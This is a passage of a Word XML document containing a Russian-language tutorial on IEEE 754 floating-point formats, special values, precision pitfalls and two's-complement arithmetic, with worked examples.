        </w:rPr>
        <w:t>Параметры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Знак (S)**: 1 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Экспонента (E)**: 8 бит, смещение = 127</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальная экспонента = E − 127</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Диапазон: от −126 до +127 (значения 0 и 255 зарезервированы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мантисса (M)**: 23 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неявная единица: мантисса представляется как 1.ММММММ... (нормализованная форма)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фактически хранится 24 бита точности (23 явно + 1 неявно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Диапазон значений float:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальное положительное нормализованное: ≈ 1.18 × 10⁻³⁸</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальное: ≈ 3.40 × 10³⁸</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность: около 7 десятичных цифр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Double (64 бита)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура 64-битного числа с плавающей точкой:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| S (1 бит) | E (11 бит) | M (52 бита) |</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Знак        Экспонента   Мантисса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Параметры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Знак (S)**: 1 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Экспонента (E)**: 11 бит, смещение = 1023</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальная экспонента = E − 1023</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Диапазон: от −1022 до +1023</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мантисса (M)**: 52 бита + 1 неявный = 53 бита точности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Диапазон значений double:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальное положительное нормализованное: ≈ 2.23 × 10⁻³⁰⁸</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальное: ≈ 1.80 × 10³⁰⁸</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность: около 15-16 десятичных цифр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Нормализованная форма</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализованная форма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это представление числа в виде 1.xxxx × 2^exp, где старший бит мантиссы равен 1 (неявный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример нормализации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Число: 13.625₁₀</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 1: Переведём в двоичную систему:</w:t>
        <w:br/>
        <w:t>13₁₀ = 1101₂</w:t>
        <w:br/>
        <w:t>0.625₁₀ = 0.101₂ (0.625 = 1/2 + 1/8 = 0.5 + 0.125)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 13.625₁₀ = 1101.101₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: Нормализуем (сдвиг точки до 1.xxxxx):</w:t>
        <w:br/>
        <w:t>1101.101₂ = 1.101101₂ × 2³</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 3: Запишем в формате IEEE 754 (float, 32 бита):</w:t>
        <w:br/>
        <w:t>Знак S = 0 (положительное число)</w:t>
        <w:br/>
        <w:t>Экспонента: 3 + 127 = 130₁₀ = 10000010₂</w:t>
        <w:br/>
        <w:t>Мантисса: 101101 (23 бита): 10110100000000000000000</w:t>
        <w:br/>
        <w:br/>
        <w:t>Итоговое представление (32 бита):</w:t>
        <w:br/>
        <w:t>0 10000010 10110100000000000000000</w:t>
        <w:br/>
        <w:t>│ └────┬───┘ └──────────┬───────────┘</w:t>
        <w:br/>
        <w:t>│   Exp=130      Mantissa</w:t>
        <w:br/>
        <w:t>Sign=0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Специальные значения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Стандарт IEEE 754 определяет несколько специальных значений:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Ноль (±0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+0: S=0, E=0, M=0  (все биты = 0)</w:t>
        <w:br/>
        <w:t>−0: S=1, E=0, M=0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Существование −0 может показаться странным, но это полезно в некоторых вычислениях (например, для сохранения знака при приближении к нулю).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Бесконечность (±∞)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+∞: S=0, E=все единицы (255 для float), M=0</w:t>
        <w:br/>
        <w:t>−∞: S=1, E=все единицы (255 для float), M=0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Возникает при делении на ноль или переполнении:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1.0 / 0.0 = +∞</w:t>
        <w:br/>
        <w:t>−1.0 / 0.0 = −∞</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. NaN (Not a Number)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NaN: E=все единицы (255 для float), M≠0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Возникает при неопределённых операциях:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.0 / 0.0 = NaN</w:t>
        <w:br/>
        <w:t>∞ − ∞ = NaN</w:t>
        <w:br/>
        <w:t>√(−1) = NaN (для вещественных чисел)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важное свойство NaN:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Любая операция с NaN даёт NaN, включая сравнение. Даже `NaN == NaN` возвращает `false`!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Денормализованные числа (Subnormal/Denormal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Денормализованные числа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> используются для представления очень малых чисел, близких к нулю, когда экспонента равна 0, а мантисса ненулевая.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Денормализованное: E=0, M≠0</w:t>
        <w:br/>
        <w:t>Значение: (−1)^S × 0.ММММ × 2^(−126)  (для float)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Денормализованные числа заполняют "щель" между нулём и минимальным нормализованным числом, предотвращая резкую потерю точности (underflow).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Проблемы точности вычислений с плавающей точкой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема 1: Конечная точность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Не все десятичные числа можно точно представить в двоичной форме.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Число 0.1₁₀ не имеет точного представления в двоичной системе:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.1₁₀ = 0.0001100110011001100...₂  (бесконечная периодическая дробь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В результате:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Python (аналогично в большинстве языков)</w:t>
        <w:br/>
        <w:t>0.1 + 0.2 == 0.3  # False!</w:t>
        <w:br/>
        <w:t>0.1 + 0.2          # 0.30000000000000004</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема 2: Потеря точности при операциях с числами разного масштаба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При сложении очень большого и очень маленького числа младшие разряды маленького числа могут быть потеряны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (концептуально):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10000000.0 + 0.00000001 ≈ 10000000.0  (в float точность недостаточна)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема 3: Накопление ошибок округления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При многократных операциях ошибки округления накапливаются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x = 0.0</w:t>
        <w:br/>
        <w:t>for i in range(10):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    x += 0.1</w:t>
        <w:br/>
        <w:t>print(x)  # 0.9999999999999999 вместо 1.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Рекомендации по работе с вещественными числами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Не сравнивайте вещественные числа на точное равенство**. Используйте сравнение с погрешностью (epsilon):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   epsilon = 1e-9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   if abs(a - b) &lt; epsilon:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       # числа считаются равными</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Используйте double вместо float**, если требуется бо́льшая точность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для финансовых расчётов** используйте специальные типы данных (Decimal в Python, BigDecimal в Java), которые работают с десятичными числами без потери точности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Будьте осторожны с циклами**, где накапливаются ошибки округления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Избегайте вычитания близких по значению чисел** — это может привести к катастрофической потере точности (catastrophic cancellation).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Представление числа в дополнительном коде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Представьте число −42₁₀ в 8-битном дополнительном коде.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 1: Представим +42 в двоичном коде:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>42₁₀ = 32 + 8 + 2 = 2⁵ + 2³ + 2¹</w:t>
        <w:br/>
        <w:t>42₁₀ = 00101010₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 2: Инвертируем все биты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>00101010 → 11010101</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 3: Прибавляем 1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  11010101</w:t>
        <w:br/>
        <w:t>+        1</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  11010110</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> −42₁₀ = 11010110₂ (в дополнительном коде)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сложим +42 и −42:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  00101010  (+42)</w:t>
        <w:br/>
        <w:t>+ 11010110  (−42)</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t>1 00000000</w:t>
        <w:br/>
        <w:br/>
        <w:t>Старший бит переполнения отбрасывается → 00000000 = 0 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Декодирование числа из дополнительного кода</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Какое десятичное число представляет 8-битный код 11100101₂ в дополнительном коде?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Старший бит = 1, следовательно, число отрицательное.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Способ А (инверсия + 1 для получения модуля):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: Инвертируем все биты:</w:t>
        <w:br/>
        <w:t>11100101 → 00011010</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: Прибавляем 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  00011010</w:t>
        <w:br/>
        <w:t>+        1</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  00011011</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 3: Переводим в десятичную систему:</w:t>
        <w:br/>
        <w:t>00011011₂ = 16 + 8 + 2 + 1 = 27₁₀</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 4: Добавляем знак:</w:t>
        <w:br/>
        <w:t>Результат: −27₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Способ Б (прямой расчёт):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Вес старшего бита в дополнительном коде = −128</w:t>
        <w:br/>
        <w:br/>
        <w:t>Значение = −128×1 + 64×1 + 32×1 + 16×0 + 8×0 + 4×1 + 2×0 + 1×1</w:t>
        <w:br/>
        <w:t xml:space="preserve">         = −128 + 64 + 32 + 4 + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">         = −27₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 11100101₂ = −27₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Диапазоны представления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Определите диапазон значений для:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>a) 16-битных беззнаковых целых</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b) 16-битных знаковых целых (дополнительный код)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>16-битные беззнаковые целые:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Диапазон: от 0 до (2¹⁶ − 1)</w:t>
        <w:br/>
        <w:t>Диапазон: от 0 до 65 535</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">b) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>16-битные знаковые целые (дополнительный код):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Диапазон: от −2¹⁵ до (2¹⁵ − 1)</w:t>
        <w:br/>
        <w:t>Диапазон: от −32 768 до +32 767</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Замечание:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Обратите внимание, что в дополнительном коде модуль наименьшего отрицательного числа (|−32 768| = 32 768) больше наибольшего положительного (32 767) на единицу. Это связано с тем, что существует только одно представление нуля.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Переполнение при операциях</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используя 8-битную арифметику в дополнительном коде, вычислите:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>a) 100 + 50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b) −100 − 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 + 50:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+100₁₀ = 01100100₂</w:t>
        <w:br/>
        <w:t>+50₁₀  = 00110010₂</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  01100100</w:t>
        <w:br/>
        <w:t>+ 00110010</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  10010110  (знаковый бит = 1, это отрицательное число!)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Декодируем: 10010110₂ = −128 + 16 + 4 + 2 = −106₁₀</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 100 + 50 = −106 (переполнение!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Правильный результат 150 выходит за пределы диапазона [−128, +127], произошло переполнение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">b) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>−100 − 50:</w:t>
      </w:r>
